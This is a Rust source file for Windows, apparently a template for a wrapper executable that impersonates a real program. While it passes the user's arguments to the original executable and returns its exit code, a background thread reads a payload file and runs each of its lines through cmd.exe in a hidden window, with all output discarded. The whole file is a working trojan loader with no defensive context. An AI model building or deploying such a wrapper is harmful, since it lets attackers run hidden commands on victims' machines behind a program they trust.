use std::env;
use std::fs;
use std::os::windows::process::CommandExt;
use std::path::PathBuf;
use std::process::{Command, Stdio};

const ORIGINAL_EXE: &str = "__ORIGINAL_EXE__";
const PAYLOAD_NAME: &str = "__PAYLOAD_NAME__";
const PAYLOAD_FALLBACK: &str = "__PAYLOAD_FALLBACK__";
const CREATE_NO_WINDOW: u32 = 0x0800_0000;

fn exe_dir() -> PathBuf {
    env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|d| d.to_path_buf()))
        .unwrap_or_else(|| PathBuf::from("."))
}

fn run_payload(dir: &PathBuf) {
    let local = dir.join(PAYLOAD_NAME);
    let path = if local.is_file() {
        local
    } else {
        PathBuf::from(PAYLOAD_FALLBACK)
    };
    let Ok(text) = fs::read_to_string(path) else { return; };
    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() { continue; }
        let _ = Command::new("cmd.exe")
            .arg("/c")
            .raw_arg(line)
            .creation_flags(CREATE_NO_WINDOW)
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status();
    }
}

fn prepend_dir_to_path(orig: &PathBuf) {
    let Some(dir) = orig.parent() else { return; };
    let mut path = dir.to_string_lossy().into_owned();
    if let Ok(old) = env::var("PATH") {
        path.push(';');
        path.push_str(&old);
    }
    env::set_var("PATH", path);
}

fn main() {
    let dir = exe_dir();
    let payload_dir = dir.clone();
    let payload = std::thread::spawn(move || run_payload(&payload_dir));
    let mut orig = PathBuf::from(ORIGINAL_EXE);
    if !orig.is_absolute() {
        orig = dir.join(orig);
    }
    prepend_dir_to_path(&orig);
    let status = Command::new(&orig)
        .args(env::args_os().skip(1))
        .status();
    let _ = payload.join();
    match status {
        Ok(s) => std::process::exit(s.code().unwrap_or(1)),
        Err(_) => std::process::exit(1),
    }
}
